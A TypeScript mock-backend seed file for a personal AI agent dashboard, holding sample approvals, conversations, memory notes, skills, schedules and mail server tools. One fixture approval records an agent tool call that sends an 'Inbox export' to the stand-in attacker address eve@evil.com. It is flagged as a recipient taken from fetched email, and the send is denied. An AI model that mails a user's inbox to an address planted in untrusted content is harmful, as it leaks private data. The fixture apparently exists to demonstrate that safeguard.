// The mock backend's starting state: the recorded runs from tests/core/runs/*.json (real runs of the harness),
// plus memory notes, skills, schedules and servers shaped like the ones the harness keeps today.

import type { Approval, Conversation, McpServer, McpTool, Message, Note, RunDetail, RunEvent, Schedule, Skill, SkillProposal, SkillDetail } from '../types'
import { summarize } from './inspector'

type Recorded = { events: Omit<RunEvent, 'at'>[] }

const recorded = import.meta.glob<Recorded>('../../../../tests/core/runs/*.json', { eager: true, import: 'default' })

const MINUTE = 60_000
export const iso = (ms: number) => new Date(ms).toISOString().replace('Z', '+00:00')

// A stable uuid-looking id from a name, so links to a recorded run survive a reload
export function fakeId(name: string) {
  let h = 2166136261
  const hex: string[] = []
  for (let round = 0; round < 4; round++) {
    for (const ch of name + round) h = Math.imul(h ^ ch.charCodeAt(0), 16777619)
    hex.push((h >>> 0).toString(16).padStart(8, '0'))
  }
  const s = hex.join('')
  return `${s.slice(0, 8)}-${s.slice(8, 12)}-4${s.slice(13, 16)}-a${s.slice(17, 20)}-${s.slice(20, 32)}`
}

// Recorded events have no times: spread them over the run's duration, starting `ago` ms before now
function timed(events: Omit<RunEvent, 'at'>[], startMs: number): RunEvent[] {
  const end = events.find((e) => e.type === 'run_end')
  const duration = typeof end?.payload.duration_ms === 'number' ? end.payload.duration_ms : events.length
  return events.map((event, i) => ({ ...event, at: iso(startMs + Math.round((duration * i) / Math.max(1, events.length - 1))) }))
}

export function seedRuns(now: number): RunDetail[] {
  const entries = Object.entries(recorded).sort(([a], [b]) => a.localeCompare(b))
  return entries.map(([path, run], i) => {
    const name = path.split('/').pop()!.replace('.json', '')
    const events = timed(run.events, now - (i + 1) * 47 * MINUTE)
    return { run_id: fakeId(name), summary: summarize(events), events }
  })
}

export function seedApprovals(now: number, runs: RunDetail[]): Approval[] {
  const inbox = runs.find((r) => r.summary.untrusted_sources.length)?.run_id ?? null
  const card = (fields: Partial<Approval> & Pick<Approval, 'approval_id' | 'tool' | 'arguments' | 'status'>, agoMs: number): Approval => ({
    reason: '',
    suspicious_recipients: [],
    untrusted_sources: [],
    created_at: iso(now - agoMs),
    expires_at: iso(now - agoMs + 60_000),
    channel: 'web',
    run_id: null,
    ...fields,
  })
  return [
    card({ approval_id: 'a-7e1f', tool: 'GMAIL_SEND_EMAIL', status: 'denied', run_id: inbox, channel: 'terminal',
      arguments: { to: 'eve@evil.com', subject: 'Inbox export', body: 'Here is everything from this week.' },
      suspicious_recipients: [{ value: 'eve@evil.com', source: 'GMAIL_FETCH_EMAILS' }] }, 140 * MINUTE),
    card({ approval_id: 'a-52c0', tool: 'schedule_create', status: 'approved',
      arguments: { message: 'Send me my morning brief', cron: '0 8 * * 1-5' },
      reason: 'Your agent will run this on its own at these times, without asking you first. See and remove schedules with `local-agent schedules`.' }, 3 * 24 * 60 * MINUTE),
    card({ approval_id: 'a-91d4', tool: 'GMAIL_CREATE_DRAFT', status: 'preapproved', channel: 'schedule',
      arguments: { to: 'dana@acme.com', subject: 'Re: launch dates', body: 'Thursday works for me.' } }, 26 * 60 * MINUTE),
    card({ approval_id: 'a-0b6a', tool: 'shell_run', status: 'expired', channel: 'telegram',
      arguments: { command: 'du -sh *' },
      reason: 'This runs on your computer with your permissions, in workspace/files/. Check the command before you allow it.' }, 5 * 24 * 60 * MINUTE),
  ]
}

export function seedConversations(now: number): { conversations: Conversation[]; messages: Record<string, Message[]> } {
  const tg = 'c-telegram-1'
  const term = 'c-terminal-1'
  const messages: Record<string, Message[]> = {
    [tg]: [
      { id: 11, role: 'user', content: 'What time is my dentist on Friday?', created_at: iso(now - 300 * MINUTE), run_id: null },
      { id: 12, role: 'assistant', content: 'Friday at 10:30, at Dr. Levi\'s on Rothschild.', created_at: iso(now - 299 * MINUTE), run_id: fakeId('clean_run') },
    ],
    [term]: [
      { id: 3, role: 'user', content: 'I prefer short replies.', created_at: iso(now - 2 * 24 * 60 * MINUTE), run_id: null },
      { id: 4, role: 'assistant', content: 'Got it. Short replies from now on.', created_at: iso(now - 2 * 24 * 60 * MINUTE + 4000), run_id: null },
    ],
  }
  return {
    conversations: [
      { id: tg, source: 'telegram', started_at: iso(now - 300 * MINUTE), last_message_at: iso(now - 299 * MINUTE), preview: 'What time is my dentist on Friday?' },
      { id: term, source: 'terminal', started_at: iso(now - 2 * 24 * 60 * MINUTE), last_message_at: iso(now - 2 * 24 * 60 * MINUTE + 4000), preview: 'I prefer short replies.' },
    ],
    messages,
  }
}

export const FOLDERS: Record<string, string> = {
  profile: 'Who the user is: name, work, where they live, how they like to be addressed.',
  people: 'One note per person the user mentions: who they are, how they relate.',
  projects: 'What the user is working on, with status and next steps.',
  preferences: 'How the user likes things done: tone, formats, tools.',
  decisions: 'Choices the user made and why, so they aren\'t asked again.',
  routines: 'What the user does regularly, and when.',
}

export function seedNotes(now: number): Note[] {
  const note = (fields: Partial<Note> & Pick<Note, 'path' | 'title' | 'body'>, agoMin: number): Note => ({
    trust: 'high', source: 'user', source_detail: '', links: [], linked_from: [], updated_at: iso(now - agoMin * MINUTE), ...fields,
  })
  return [
    note({ path: 'profile/me.md', title: 'Me', body: '- Product designer, works from Tel Aviv\n- Mornings are for deep work; meetings after 13:00' }, 9000),
    note({ path: 'people/dana.md', title: 'Dana', trust: 'low', source: 'agent', source_detail: 'run 3f2a91c0, after reading web_search',
      body: '- Designer at Acme, works with me on [[website-redesign]]\n- Prefers email over Slack', links: ['website-redesign'] }, 600),
    note({ path: 'projects/website-redesign.md', title: 'Website redesign', source: 'distill',
      body: '- New landing page for Acme, launch planned for November\n- Dana owns the visual design\n- Next: review the pricing section', linked_from: ['people/dana.md'] }, 1500),
    note({ path: 'preferences/replies.md', title: 'Replies', source: 'distill', body: '- Prefers short replies\n- No emoji' }, 2880),
    note({ path: 'routines/mornings.md', title: 'Mornings', body: '- Morning brief at 8:00 on weekdays\n- Gym on Tuesday and Thursday at 7:00' }, 4300),
  ]
}

const BUILTIN: Omit<SkillDetail, 'available' | 'missing'>[] = [
  { name: 'inbox-triage', source: 'builtin', requires: ['email'], model: 'strong', files: [], adjustments: [],
    description: 'Sort unread email into reply now / later / no action, and draft the replies. Use for "triage my inbox", "what should I answer", "clean up my email".',
    instructions: '1. Fetch unread email (last 3 days, at most 40). Group a thread as one item.\n2. Sort each into reply now, reply later or no action.\n3. Draft replies for "reply now"; never send them.' },
  { name: 'meeting-prep', source: 'builtin', requires: ['calendar'], model: null, files: [], adjustments: [],
    description: 'A one-page brief before a meeting: who\'s coming, what it\'s about, open threads, what to decide. Use for "prep me for my next meeting", "brief me on the 3pm".',
    instructions: '1. Find the meeting (next one if not named): title, time, attendees, description, attached docs.\n2. For each attendee: search memory first.' },
  { name: 'morning-brief', source: 'builtin', requires: ['email'], model: null, files: [], adjustments: ['Slack first', 'No weather'],
    description: 'Today\'s agenda, what needs a reply, and anything urgent, in one short message. Use for "morning brief", "what\'s my day", "catch me up".',
    instructions: '1. Calendar, if one is connected: today\'s events from now until the end of the day, in the user\'s timezone.\n2. Email: unread from the last 24 hours, newest first, at most 30.' },
  { name: 'research-report', source: 'builtin', requires: ['web_search'], model: null, files: ['report-template.md'], adjustments: [],
    description: 'Research a question on the web and write a short sourced report. Use for "research", "find out about", "compare", "write up what\'s known about".',
    instructions: '1. Restate the question in one line.\n2. Search 2 to 4 focused queries, not one broad one.' },
  { name: 'skill-writer', source: 'builtin', requires: ['owner'], model: null, files: [], adjustments: [],
    description: 'Turn a task that just went well into a reusable skill, for the user to review. Use when the user says "remember how to do this", "make this a skill".',
    instructions: '1. Look back at what you did in this conversation.\n2. Write the skill.' },
  { name: 'weekly-review', source: 'builtin', requires: ['memory'], model: null, files: [], adjustments: [],
    description: 'Look back at the week and plan the next one, from memory and the calendar. Use for "weekly review", "how did my week go", "plan next week".',
    instructions: '1. Memory: read the notes in projects/, decisions/ and routines/ that changed recently.\n2. Calendar (if connected).' },
  { name: 'gym-log', source: 'user', requires: ['memory'], model: null, files: [], adjustments: [],
    description: 'Log a workout and compare it with last week. Use for "log my workout", "gym today".',
    instructions: '1. Ask what was done if not said.\n2. Append it to routines/gym.md with today\'s date.' },
]

// What the mock "has": the gmail server provides email; memory and owner come with the owner talking
export const CAPABILITIES = new Set(['email', 'memory', 'owner'])

export const withAvailability = (skill: Omit<SkillDetail, 'available' | 'missing'>): SkillDetail => {
  const missing = skill.requires.filter((r) => !r.split('|').some((option) => CAPABILITIES.has(option.trim())))
  return { ...skill, available: missing.length === 0, missing }
}

export const seedSkills = (): SkillDetail[] => BUILTIN.map(withAvailability)

export const skillListItem = (detail: SkillDetail): Skill => {
  const { instructions, ...skill } = detail
  void instructions
  return skill
}

export const seedProposals = (): SkillProposal[] => [
  { name: 'weekly-sales-digest', requires: ['email'], proposed_by: 'run 9b04e2d1, after "make this a skill"',
    description: 'A Friday digest of deals that moved this week, from email. Use for "sales digest", "what moved this week".',
    instructions: '1. Search email from this week for threads with customers.\n2. List deals that moved, one line each.\n3. End with what needs a reply before Monday.' },
]

export function seedSchedules(now: number): Schedule[] {
  const nextWeekday8 = new Date(now)
  nextWeekday8.setUTCDate(nextWeekday8.getUTCDate() + 1)
  nextWeekday8.setUTCHours(6, 0, 0, 0)
  return [
    { id: 1, message: 'Send me my morning brief', cron: '0 8 * * 1-5', at: null, timezone: 'Asia/Jerusalem',
      next_fire_at: iso(nextWeekday8.getTime()), last_fired_at: iso(now - 20 * 60 * MINUTE), active: true,
      when: `every: 0 8 * * 1-5 (next ${nextWeekday8.toLocaleDateString('en-US', { weekday: 'short' })} 08:00 Asia/Jerusalem)` },
    { id: 2, message: 'Remind me to send the invoice to Acme', cron: null, at: '2026-10-30T09:00:00', timezone: 'Asia/Jerusalem',
      next_fire_at: '2026-10-30T07:00:00.000000+00:00', last_fired_at: null, active: true,
      when: 'once: 2026-10-30 09:00 Asia/Jerusalem' },
    { id: 3, message: 'Weekly review', cron: '0 17 * * 5', at: null, timezone: 'Asia/Jerusalem',
      next_fire_at: null, last_fired_at: iso(now - 9 * 24 * 60 * MINUTE), active: false, when: 'cancelled' },
  ]
}

export function seedServers(): { servers: McpServer[]; tools: Record<string, McpTool[]> } {
  return {
    servers: [
      { name: 'gmail', transport: 'stdio', target: 'npx -y @example/gmail-mcp', provides: ['email'], always_allow: ['create_draft'],
        secrets: ['GMAIL_TOKEN'], connected: true, error: null },
      { name: 'notes', transport: 'http', target: 'https://notes.example/mcp', provides: [], always_allow: [],
        secrets: ['Authorization'], connected: false, error: 'Could not connect: connection refused' },
    ],
    tools: {
      gmail: [
        { tool: 'fetch_emails', registered_name: 'GMAIL_FETCH_EMAILS', description: 'Fetch emails from the inbox, newest first.', tier: 'read-only' },
        { tool: 'send_email', registered_name: 'GMAIL_SEND_EMAIL', description: 'Send an email to one or more recipients.', tier: 'asks' },
        { tool: 'create_draft', registered_name: 'GMAIL_CREATE_DRAFT', description: 'Save a draft without sending it.', tier: 'always allowed' },
      ],
      notes: [],
    },
  }
}
